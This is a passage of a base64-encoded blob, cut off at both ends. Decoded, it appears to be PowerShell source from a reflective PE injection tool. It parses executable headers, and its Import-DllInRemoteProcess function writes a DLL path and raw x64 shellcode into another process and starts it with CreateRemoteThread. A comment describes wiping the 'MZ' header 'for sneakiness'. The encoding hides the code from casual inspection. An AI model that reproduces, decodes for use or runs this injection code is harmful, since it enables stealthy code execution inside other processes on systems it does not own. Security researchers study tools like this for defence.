iB3YXMgY2FsbGVkIGFuZCB0aGVuIGRlc3Ryb3llZCAnTVonIGZvciBzbmVha2luZXNzCiAgICAgICAgJGRvc0hlYWRlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRQRUhhbmRsZSwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfRE9TX0hFQURFUikKCiAgICAgICAgI0dldCBJTUFHRV9OVF9IRUFERVJTCiAgICAgICAgW0ludFB0cl0kTnRIZWFkZXJzUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVIYW5kbGUpIChbSW50NjRdW1VJbnQ2NF0kZG9zSGVhZGVyLmVfbGZhbmV3KSkKICAgICAgICAkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50SGVhZGVyc1B0ciAtVmFsdWUgJE50SGVhZGVyc1B0cgogICAgICAgICRpbWFnZU50SGVhZGVyczY0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE50SGVhZGVyc1B0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzY0KQogICAgICAgIAogICAgICAgICNNYWtlIHN1cmUgdGhlIElNQUdFX05UX0hFQURFUlMgY2hlY2tzIG91dC4gSWYgaXQgZG9lc24ndCwgdGhlIGRhdGEgc3RydWN0dXJlIGlzIGludmFsaWQuIFRoaXMgc2hvdWxkIG5ldmVyIGhhcHBlbi4KICAgICAgICBpZiAoJGltYWdlTnRIZWFkZXJzNjQuU2lnbmF0dXJlIC1uZSAweDAwMDA0NTUwKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIkludmFsaWQgSU1BR0VfTlRfSEVBREVSIHNpZ25hdHVyZS4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmICgkaW1hZ2VOdEhlYWRlcnM2NC5PcHRpb25hbEhlYWRlci5NYWdpYyAtZXEgJ0lNQUdFX05UX09QVElPTkFMX0hEUjY0X01BR0lDJykKICAgICAgICB7CiAgICAgICAgICAgICROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUyAtVmFsdWUgJGltYWdlTnRIZWFkZXJzNjQKICAgICAgICAgICAgJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRTY0Qml0IC1WYWx1ZSAkdHJ1ZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkSW1hZ2VOdEhlYWRlcnMzMiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCROdEhlYWRlcnNQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX05UX0hFQURFUlMzMikKICAgICAgICAgICAgJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAkaW1hZ2VOdEhlYWRlcnMzMgogICAgICAgICAgICAkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBFNjRCaXQgLVZhbHVlICRmYWxzZQogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJE50SGVhZGVyc0luZm8KICAgIH0KCgogICAgI1RoaXMgZnVuY3Rpb24gd2lsbCBnZXQgdGhlIGluZm9ybWF0aW9uIG5lZWRlZCB0byBhbGxvY2F0ZWQgc3BhY2UgaW4gbWVtb3J5IGZvciB0aGUgUEUKICAgIEZ1bmN0aW9uIEdldC1QRUJhc2ljSW5mbwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUgKV0KICAgICAgICBbQnl0ZVtdXQogICAgICAgICRQRUJ5dGVzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMKICAgICAgICApCiAgICAgICAgCiAgICAgICAgJFBFSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAogICAgICAgIAogICAgICAgICNXcml0ZSB0aGUgUEUgdG8gbWVtb3J5IHRlbXBvcmFyaWx5IHNvIEkgY2FuIGdldCBpbmZvcm1hdGlvbiBmcm9tIGl0LiBUaGlzIGlzIG5vdCBpdCdzIGZpbmFsIHJlc3Rpbmcgc3BvdC4KICAgICAgICBbSW50UHRyXSRVbm1hbmFnZWRQRUJ5dGVzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQRUJ5dGVzLkxlbmd0aCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQRUJ5dGVzLCAwLCAkVW5tYW5hZ2VkUEVCeXRlcywgJFBFQnl0ZXMuTGVuZ3RoKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgI0dldCBOdEhlYWRlcnNJbmZvCiAgICAgICAgJE50SGVhZGVyc0luZm8gPSBHZXQtSW1hZ2VOdEhlYWRlcnMgLVBFSGFuZGxlICRVbm1hbmFnZWRQRUJ5dGVzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCiAgICAgICAgCiAgICAgICAgI0J1aWxkIGEgc3RydWN0dXJlIHdpdGggdGhlIGluZm9ybWF0aW9uIHdoaWNoIHdpbGwgYmUgbmVlZGVkIGZvciBhbGxvY2F0aW5nIG1lbW9yeSBhbmQgd3JpdGluZyB0aGUgUEUgdG8gbWVtb3J5CiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdQRTY0Qml0JyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLlBFNjRCaXQpCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdPcmlnaW5hbEltYWdlQmFzZScgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltYWdlQmFzZSkKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkltYWdlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSW1hZ2UpCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdTaXplT2ZIZWFkZXJzJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSGVhZGVycykKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ0RsbENoYXJhY3RlcmlzdGljcycgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkRsbENoYXJhY3RlcmlzdGljcykKICAgICAgICAKICAgICAgICAjRnJlZSB0aGUgbWVtb3J5IGFsbG9jYXRlZCBhYm92ZSwgdGhpcyBpc24ndCB3aGVyZSB3ZSBhbGxvY2F0ZSB0aGUgUEUgdG8gbWVtb3J5CiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJFVubWFuYWdlZFBFQnl0ZXMpCiAgICAgICAgCiAgICAgICAgcmV0dXJuICRQRUluZm8KICAgIH0KCgogICAgI1BFSW5mbyBtdXN0IGNvbnRhaW4gdGhlIGZvbGxvd2luZyBOb3RlUHJvcGVydGllczoKICAgICMgICBQRUhhbmRsZTogQW4gSW50UHRyIHRvIHRoZSBhZGRyZXNzIHRoZSBQRSBpcyBsb2FkZWQgdG8gaW4gbWVtb3J5CiAgICBGdW5jdGlvbiBHZXQtUEVEZXRhaWxlZEluZm8KICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRQRUhhbmRsZSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMlR5cGVzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgKQogICAgICAgIAogICAgICAgIGlmICgkUEVIYW5kbGUgLWVxICRudWxsIC1vciAkUEVIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgJ1BFSGFuZGxlIGlzIG51bGwgb3IgSW50UHRyLlplcm8nCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRQRUluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5PYmplY3QKICAgICAgICAKICAgICAgICAjR2V0IE50SGVhZGVycyBpbmZvcm1hdGlvbgogICAgICAgICROdEhlYWRlcnNJbmZvID0gR2V0LUltYWdlTnRIZWFkZXJzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKICAgICAgICAKICAgICAgICAjQnVpbGQgdGhlIFBFSW5mbyBvYmplY3QKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEVIYW5kbGUgLVZhbHVlICRQRUhhbmRsZQogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUykKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTnRIZWFkZXJzUHRyIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uTnRIZWFkZXJzUHRyKQogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRTY0Qml0IC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uUEU2NEJpdCkKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkltYWdlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSW1hZ2UpCiAgICAgICAgCiAgICAgICAgaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLk50SGVhZGVyc1B0cikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9OVF9IRUFERVJTNjQpKSkKICAgICAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFNlY3Rpb25IZWFkZXJQdHIgLVZhbHVlICRTZWN0aW9uSGVhZGVyUHRyCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJFNlY3Rpb25IZWFkZXJQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uTnRIZWFkZXJzUHRyKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX05UX0hFQURFUlMzMikpKQogICAgICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgU2VjdGlvbkhlYWRlclB0ciAtVmFsdWUgJFNlY3Rpb25IZWFkZXJQdHIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLkZpbGVIZWFkZXIuQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0RMTCkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0RMTCkKICAgICAgICB7CiAgICAgICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGaWxlVHlwZSAtVmFsdWUgJ0RMTCcKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRklMRV9FWEVDVVRBQkxFX0lNQUdFKSAtZXEgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0ZJTEVfRVhFQ1VUQUJMRV9JTUFHRSkKICAgICAgICB7CiAgICAgICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGaWxlVHlwZSAtVmFsdWUgJ0VYRScKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlBFIGZpbGUgaXMgbm90IGFuIEVYRSBvciBETEwiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiAkUEVJbmZvCiAgICB9CiAgICAKICAgIAogICAgRnVuY3Rpb24gSW1wb3J0LURsbEluUmVtb3RlUHJvY2VzcwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRSZW1vdGVQcm9jSGFuZGxlLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MSwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRJbXBvcnREbGxQYXRoUHRyCiAgICAgICAgKQogICAgICAgIAogICAgICAgICRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQogICAgICAgIAogICAgICAgICRJbXBvcnREbGxQYXRoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRJbXBvcnREbGxQYXRoUHRyKQogICAgICAgICREbGxQYXRoU2l6ZSA9IFtVSW50UHRyXVtVSW50NjRdKFtVSW50NjRdJEltcG9ydERsbFBhdGguTGVuZ3RoICsgMSkKICAgICAgICAkUkltcG9ydERsbFBhdGhQdHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgJERsbFBhdGhTaXplLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQogICAgICAgIGlmICgkUkltcG9ydERsbFBhdGhQdHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIgogICAgICAgIH0KCiAgICAgICAgW1VJbnRQdHJdJE51bUJ5dGVzV3JpdHRlbiA9IFtVSW50UHRyXTo6WmVybwogICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSSW1wb3J0RGxsUGF0aFB0ciwgJEltcG9ydERsbFBhdGhQdHIsICREbGxQYXRoU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgIAogICAgICAgIGlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBETEwgcGF0aCB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkiCiAgICAgICAgfQogICAgICAgIGlmICgkRGxsUGF0aFNpemUgLW5lICROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiRGlkbid0IHdyaXRlIHRoZSBleHBlY3RlZCBhbW91bnQgb2YgYnl0ZXMgd2hlbiB3cml0aW5nIGEgRExMIHBhdGggdG8gbG9hZCB0byB0aGUgcmVtb3RlIHByb2Nlc3MiCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJrZXJuZWwzMi5kbGwiKQogICAgICAgICRMb2FkTGlicmFyeUFBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJMb2FkTGlicmFyeUEiKSAjS2VybmVsMzIgbG9hZGVkIHRvIHRoZSBzYW1lIGFkZHJlc3MgZm9yIGFsbCBwcm9jZXNzZXMKICAgICAgICAKICAgICAgICBbSW50UHRyXSREbGxBZGRyZXNzID0gW0ludFB0cl06Olplcm8KICAgICAgICAjRm9yIDY0Yml0IERMTCdzLCB3ZSBjYW4ndCB1c2UganVzdCBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBMb2FkTGlicmFyeSBiZWNhdXNlIEdldEV4aXRDb2RlVGhyZWFkIHdpbGwgb25seSBnaXZlIGJhY2sgYSAzMmJpdCB2YWx1ZSwgYnV0IHdlIG5lZWQgYSA2NGJpdCBhZGRyZXNzCiAgICAgICAgIyAgIEluc3RlYWQsIHdyaXRlIHNoZWxsY29kZSB3aGlsZSBjYWxscyBMb2FkTGlicmFyeSBhbmQgd3JpdGVzIHRoZSByZXN1bHQgdG8gYSBtZW1vcnkgYWRkcmVzcyB3ZSBzcGVjaWZ5LiBUaGVuIHJlYWQgZnJvbSB0aGF0IG1lbW9yeSBvbmNlIHRoZSB0aHJlYWQgZmluaXNoZXMuCiAgICAgICAgaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICAjQWxsb2NhdGUgbWVtb3J5IGZvciB0aGUgYWRkcmVzcyByZXR1cm5lZCBieSBMb2FkTGlicmFyeUEKICAgICAgICAgICAgJExvYWRMaWJyYXJ5QVJldE1lbSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCAkRGxsUGF0aFNpemUsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpCiAgICAgICAgICAgIGlmICgkTG9hZExpYnJhcnlBUmV0TWVtIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciB0aGUgcmV0dXJuIHZhbHVlIG9mIExvYWRMaWJyYXJ5QSIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgICNXcml0ZSBTaGVsbGNvZGUgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIHdoaWNoIHdpbGwgY2FsbCBMb2FkTGlicmFyeUEgKFNoZWxsY29kZTogTG9hZExpYnJhcnlBLmFzbSkKICAgICAgICAgICAgJExvYWRMaWJyYXJ5U0MxID0gQCgweDUzLCAweDQ4LCAweDg5LCAweGUzLCAweDQ4LCAweDgzLCAweGVjLCAweDIwLCAweDY2LCAweDgzLCAweGU0LCAweGMwLCAweDQ4LCAweGI5KQogICAgICAgICAgICAkTG9hZExpYnJhcnlTQzIgPSBAKDB4NDgsIDB4YmEpCiAgICAgICAgICAgICRMb2FkTGlicmFyeVNDMyA9IEAoMHhmZiwgMHhkMiwgMHg0OCwgMHhiYSkKICAgICAgICAgICAgJExvYWRMaWJyYXJ5U0M0ID0gQCgweDQ4LCAweDg5LCAweDAyLCAweDQ4LCAweDg5LCAweGRjLCAweDViLCAweGMzKQogICAgICAgICAgICAKICAgICAgICAgICAgJFNDTGVuZ3RoID0gJExvYWRMaWJyYXJ5U0MxLkxlbmd0aCArICRMb2FkTGlicmFyeVNDMi5MZW5ndGggKyAkTG9hZExpYnJhcnlTQzMuTGVuZ3RoICsgJExvYWRMaWJyYXJ5U0M0Lkxlbmd0aCArICgkUHRyU2l6ZSAqIDMpCiAgICAgICAgICAgICRTQ1BTTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRTQ0xlbmd0aCkKICAgICAgICAgICAgJFNDUFNNZW1PcmlnaW5hbCA9ICRTQ1BTTWVtCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkTG9hZExpYnJhcnlTQzEgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJExvYWRMaWJyYXJ5U0MxLkxlbmd0aCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFJJbXBvcnREbGxQYXRoUHRyLCAkU0NQU01lbSwgJGZhbHNlKQogICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJExvYWRMaWJyYXJ5U0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRMb2FkTGlicmFyeVNDMi5MZW5ndGgpCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRMb2FkTGlicmFyeUFBZGRyLCAkU0NQU01lbSwgJGZhbHNlKQogICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJExvYWRMaWJyYXJ5U0MzIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRMb2FkTGlicmFyeVNDMy5MZW5ndGgpCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRMb2FkTGlicmFyeUFSZXRNZW0sICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkTG9hZExpYnJhcnlTQzQgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJExvYWRMaWJyYXJ5U0M0Lkxlbmd0aCkKCiAgICAgICAgICAgIAogICAgICAgICAgICAkUlNDQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgICAgICBpZiAoJFJTQ0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHNoZWxsY29kZSIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsICRTQ1BTTWVtT3JpZ2luYWwsIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgICAgIGlmICgoJFN1Y2Nlc3MgLWVxICRmYWxzZSkgLW9yIChbVUludDY0XSROdW1CeXRlc1dyaXR0ZW4gLW5lIFtVSW50NjRdJFNDTGVuZ3RoKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBzaGVsbGNvZGUgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5LiIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFJTQ0FkZHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLldhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCAyMDAwMCkKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLW5lIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIEdldFByb2NBZGRyZXNzIGZhaWxlZC4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICNUaGUgc2hlbGxjb2RlIHdyaXRlcyB0aGUgRExMIGFkZHJlc3MgdG8gbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBhdCBhZGRyZXNzICRMb2FkTGlicmFyeUFSZXRNZW0sIHJlYWQgdGhpcyBtZW1vcnkKICAgICAgICAgICAgW0ludFB0cl0kUmV0dX